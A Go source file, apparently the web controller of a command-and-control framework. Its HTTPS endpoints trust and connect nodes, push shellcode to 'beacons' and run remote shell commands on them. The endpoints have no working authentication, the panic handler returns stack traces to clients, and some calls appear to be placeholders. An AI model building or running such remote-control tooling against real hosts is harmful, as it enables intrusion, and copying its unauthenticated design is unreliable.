package controller

import (
	"crypto/tls"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"sync"
	"time"

	"github.com/gorilla/csrf"
	"github.com/gorilla/sessions"
	"github.com/gorilla/websocket"
	"github.com/julienschmidt/httprouter"
	"github.com/pkg/errors"
	"golang.org/x/crypto/bcrypt"

	"project/internal/bootstrap"
	"project/internal/crypto/cert"
	"project/internal/crypto/rand"
	"project/internal/guid"
	"project/internal/logger"
	"project/internal/patch/json"
	"project/internal/xpanic"
)

type hRW = http.ResponseWriter
type hR = http.Request
type hP = httprouter.Params

type web struct {
	ctx *Ctrl

	handler  *webHandler
	listener net.Listener
	server   *http.Server

	wg sync.WaitGroup
}

func newWeb(ctx *Ctrl, config *Config) (*web, error) {
	cfg := config.Web

	// load CA certificate and generate temporary certificate
	certFile, err := ioutil.ReadFile(cfg.CertFile)
	if err != nil {
		return nil, errors.WithStack(err)
	}
	keyFile, err := ioutil.ReadFile(cfg.KeyFile)
	if err != nil {
		return nil, errors.WithStack(err)
	}
	caCert, err := cert.ParseCertificate(certFile)
	if err != nil {
		return nil, errors.WithStack(err)
	}
	caPri, err := cert.ParsePrivateKey(keyFile)
	if err != nil {
		return nil, errors.WithStack(err)
	}
	pair, err := cert.Generate(caCert, caPri, &cfg.CertOpts)
	if err != nil {
		return nil, errors.WithStack(err)
	}

	// configure handler.
	wh := webHandler{ctx: ctx}
	wh.upgrader = &websocket.Upgrader{
		HandshakeTimeout: time.Minute,
		ReadBufferSize:   4096,
		WriteBufferSize:  4096,
	}
	wh.encoderPool.New = func() interface{} {
		return json.NewEncoder(64)
	}
	// configure router
	router := &httprouter.Router{
		RedirectTrailingSlash:  true,
		RedirectFixedPath:      true,
		HandleMethodNotAllowed: true,
		PanicHandler:           wh.handlePanic,
	}
	// resource
	router.ServeFiles("/css/*filepath", http.Dir(cfg.Dir+"/css"))
	router.ServeFiles("/js/*filepath", http.Dir(cfg.Dir+"/js"))
	router.ServeFiles("/img/*filepath", http.Dir(cfg.Dir+"/img"))
	// favicon.ico
	favicon, err := ioutil.ReadFile(cfg.Dir + "/favicon.ico")
	if err != nil {
		return nil, errors.WithStack(err)
	}
	router.GET("/favicon.ico", func(w hRW, _ *hR, _ hP) {
		_, _ = w.Write(favicon)
	})
	// index.html
	index, err := ioutil.ReadFile(cfg.Dir + "/index.html")
	if err != nil {
		return nil, errors.WithStack(err)
	}
	router.GET("/", func(w hRW, _ *hR, _ hP) {
		_, _ = w.Write(index)
	})
	// register router
	for path, handler := range map[string]httprouter.Handle{
		"/api/login":               wh.handleLogin,
		"/api/load_key":            wh.handleLoadKey,
		"/api/node/trust":          wh.handleTrustNode,
		"/api/node/confirm_trust":  wh.handleConfirmTrustNode,
		"/api/node/connect":        wh.handleConnectNode,
		"/api/beacon/shellcode":    wh.handleShellCode,
		"/api/beacon/single_shell": wh.handleSingleShell,
	} {
		router.POST(path, handler)
	}

	// configure HTTPS server
	listener, err := net.Listen(cfg.Network, cfg.Address)
	if err != nil {
		return nil, errors.WithStack(err)
	}
	web := web{
		ctx:      ctx,
		handler:  &wh,
		listener: listener,
	}
	tlsConfig := &tls.Config{
		Rand:         rand.Reader,
		Time:         ctx.global.Now,
		Certificates: []tls.Certificate{pair.TLSCertificate()},
	}
	web.server = &http.Server{
		TLSConfig:         tlsConfig,
		ReadHeaderTimeout: time.Minute,
		IdleTimeout:       time.Minute,
		MaxHeaderBytes:    32 << 10,
		Handler:           router,
		ErrorLog:          logger.Wrap(logger.Warning, "web", ctx.logger),
	}
	return &web, nil
}

func (web *web) Deploy() error {
	errChan := make(chan error, 1)
	web.wg.Add(1)
	go func() {
		defer func() {
			if r := recover(); r != nil {
				b := xpanic.Print(r, "web.Deploy")
				web.ctx.logger.Print(logger.Fatal, "web", b)
			}
			web.wg.Done()
		}()
		errChan <- web.server.ServeTLS(web.listener, "", "")
	}()
	timer := time.NewTimer(time.Second)
	defer timer.Stop()
	select {
	case err := <-errChan:
		return errors.WithStack(err)
	case <-timer.C:
		return nil
	}
}

func (web *web) Address() string {
	return web.listener.Addr().String()
}

func (web *web) Close() {
	_ = web.server.Close()
	web.wg.Wait()
	web.ctx = nil
	web.handler.Close()
}

type webHandler struct {
	ctx *Ctrl

	upgrader    *websocket.Upgrader
	encoderPool sync.Pool
}

func (wh *webHandler) Close() {
	wh.ctx = nil
}

// func (wh *webHandler) logf(lv logger.Level, format string, log ...interface{}) {
// 	wh.ctx.logger.Printf(lv, "web", format, log...)
// }

func (wh *webHandler) log(lv logger.Level, log ...interface{}) {
	wh.ctx.logger.Println(lv, "web", log...)
}

func (wh *webHandler) handlePanic(w hRW, _ *hR, e interface{}) {
	w.WriteHeader(http.StatusInternalServerError)

	// if is super user return the panic
	_, _ = io.Copy(w, xpanic.Print(e, "web"))
	csrf.Protect(nil, nil)
	sessions.NewSession(nil, "")
	hash, err := bcrypt.GenerateFromPassword([]byte{1, 2, 3}, 15)
	fmt.Println(string(hash), err)
}

type webError struct {
	Error string `json:"error"`
}

func (wh *webHandler) writeError(w hRW, err error) {
	w.WriteHeader(http.StatusOK)
	e := webError{}
	if err != nil {
		e.Error = err.Error()
	}
	encoder := wh.encoderPool.Get().(*json.Encoder)
	defer wh.encoderPool.Put(encoder)
	data, err := encoder.Encode(e)
	if err != nil {
		panic(err)
	}
	_, _ = w.Write(data)
}

func (wh *webHandler) writeResponse(w hRW, response interface{}) {
	w.WriteHeader(http.StatusOK)
	encoder := wh.encoderPool.Get().(*json.Encoder)
	defer wh.encoderPool.Put(encoder)
	data, err := encoder.Encode(response)
	if err != nil {
		panic(err)
	}
	_, _ = w.Write(data)
}

func (wh *webHandler) handleLogin(w hRW, r *hR, _ hP) {
	// upgrade to websocket connection, server can push message to client
	conn, err := wh.upgrader.Upgrade(w, r, nil)
	if err != nil {
		wh.log(logger.Error, "failed to upgrade", err)
		return
	}
	_ = conn.Close()
}

func (wh *webHandler) handleLoadKey(_ hRW, _ *hR, _ hP) {
	// size, check is loaded session key
	// if isClosed{
	//  return
	// }
}

// -------------------------------------------trust node-------------------------------------------

type webTrustNode struct {
	Mode    string `json:"mode"`
	Network string `json:"network"`
	Address string `json:"address"`
}

func (wh *webHandler) handleTrustNode(w hRW, r *hR, _ hP) {
	tn := webTrustNode{}
	err := json.NewDecoder(r.Body).Decode(&tn)
	if err != nil {
		wh.writeError(w, err)
		return
	}
	listener := bootstrap.NewListener(tn.Mode, tn.Network, tn.Address)
	nnr, err := wh.ctx.TrustNode(r.Context(), listener)
	if err != nil {
		wh.writeError(w, err)
		return
	}
	wh.writeResponse(w, nnr)
}

// ---------------------------------------confirm trust node---------------------------------------

type webConfirmTrustNode struct {
	ID string `json:"id"`
}

func (wh *webHandler) handleConfirmTrustNode(w hRW, r *hR, _ hP) {
	ctn := webConfirmTrustNode{}
	err := json.NewDecoder(r.Body).Decode(&ctn)
	if err != nil {
		wh.writeError(w, err)
		return
	}
	err = wh.ctx.ConfirmTrustNode(r.Context(), ctn.ID)
	wh.writeError(w, err)
}

// ------------------------------------------connect node------------------------------------------

type webConnectNode struct {
	GUID    guid.GUID `json:"guid"`
	Mode    string    `json:"mode"`
	Network string    `json:"network"`
	Address string    `json:"address"`
}

func (wh *webHandler) handleConnectNode(w hRW, r *hR, _ hP) {
	cn := webConnectNode{}
	err := json.NewDecoder(r.Body).Decode(&cn)
	if err != nil {
		wh.writeError(w, err)
		return
	}
	listener := bootstrap.NewListener(cn.Mode, cn.Network, cn.Address)
	err = wh.ctx.Synchronize(r.Context(), &cn.GUID, listener)
	if err != nil {
		wh.writeError(w, err)
		return
	}
	wh.writeError(w, nil)
}

// -------------------------------------------shellcode--------------------------------------------

type webShellCode struct {
	GUID    guid.GUID     `json:"guid"`
	Method  string        `json:"method"`
	Data    hexByteSlice  `json:"data"`
	Timeout time.Duration `json:"timeout"`
}

func (wh *webHandler) handleShellCode(w hRW, r *hR, _ hP) {
	sc := webShellCode{}
	err := json.NewDecoder(r.Body).Decode(&sc)
	if err != nil {
		wh.writeError(w, err)
		return
	}
	err = wh.ctx.ShellCode(r.Context(), &sc.GUID, sc.Method, sc.Data, sc.Timeout)
	wh.writeError(w, err)
}

// ------------------------------------------single shell------------------------------------------

type webSingleShellRequest struct {
	GUID    guid.GUID     `json:"guid"`
	Command string        `json:"command"`
	Decoder string        `json:"decoder"`
	Timeout time.Duration `json:"timeout"`
}

type webSingleShellResponse struct {
	Output string `json:"output"`
}

func (wh *webHandler) handleSingleShell(w hRW, r *hR, _ hP) {
	sr := webSingleShellRequest{}
	err := json.NewDecoder(r.Body).Decode(&sr)
	if err != nil {
		wh.writeError(w, err)
		return
	}
	output, err := wh.ctx.SingleShell(r.Context(), &sr.GUID, sr.Command, sr.Decoder, sr.Timeout)
	if err != nil {
		wh.writeError(w, err)
		return
	}
	wh.writeResponse(w, &webSingleShellResponse{Output: string(output)})
}
